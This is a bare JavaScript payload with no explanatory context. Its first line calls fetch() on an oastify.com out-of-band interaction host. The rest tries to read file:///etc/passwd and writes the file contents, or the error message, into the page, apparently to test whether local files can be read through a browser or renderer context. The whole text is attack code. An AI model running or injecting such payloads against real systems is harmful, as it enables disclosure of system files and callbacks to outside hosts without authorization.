fetch("http://lshq47lharsppiz39l18lv5fd6jx7uvj.oastify.com")


fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => {
    var i = document.createElement('div');
    i.innerText = t;
    document.body.appendChild(i);
  })
  .catch(e => {
    var i = document.createElement('div');
    i.innerText = 'err: ' + e.message;
    document.body.appendChild(i);
  });
